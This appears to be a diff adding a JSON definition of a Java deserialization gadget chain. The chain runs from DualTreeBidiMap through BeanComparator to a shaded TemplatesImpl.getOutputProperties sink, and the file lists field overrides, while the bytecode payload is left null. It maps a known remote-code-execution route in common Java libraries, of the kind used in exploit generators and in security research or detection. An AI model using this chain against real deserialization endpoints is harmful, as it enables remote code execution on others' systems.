@@ -1,0 +1,23 @@
+{
+  "chain_type": "CB1-Shaded-DualTreeBidiMap — BidiMap trigger",
+  "root_class": "org.apache.commons.collections.bidimap.DualTreeBidiMap",
+  "root_trigger": "readObject→TreeMap.put→BeanComparator.compare→TemplatesImpl.getOutputProperties",
+  "links": [
+    {
+      "class": "org.apache.commons.beanutils.BeanComparator",
+      "field_overrides": {
+        "property": "outputProperties",
+        "comparator": null
+      }
+    },
+    {
+      "class": "org.eclipse.tags.shaded.org.apache.xalan.xsltc.trax.TemplatesImpl",
+      "field_overrides": {
+        "_name": "exploit",
+        "_class": null,
+        "_bytecodes": null
+      }
+    }
+  ],
+  "sink_method": "TemplatesImpl.getOutputProperties"
+}
